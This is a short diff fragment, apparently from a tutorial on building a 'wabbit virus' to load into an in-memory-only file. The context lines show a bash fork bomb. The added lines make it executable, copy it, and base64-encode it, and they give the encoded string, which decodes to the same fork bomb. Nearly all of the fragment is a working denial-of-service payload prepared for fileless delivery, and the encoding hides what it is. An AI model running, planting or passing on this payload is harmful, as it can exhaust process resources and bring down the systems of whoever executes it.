@@ -154,3 +154,8 @@ now, let's create a wabbit virus that we can encode to the in-memory-only file,
 #!/bin/bash
 :(){ :|:& };:
 ```
+
+```chmod +x wabbit.sh```
+```cp wabbit.sh wabbit```
+```cat wabbit | base64 -w0 ; echo```
+- ```IyEvYmluL2Jhc2gKOigpeyA6fDomIH07Ogo=```
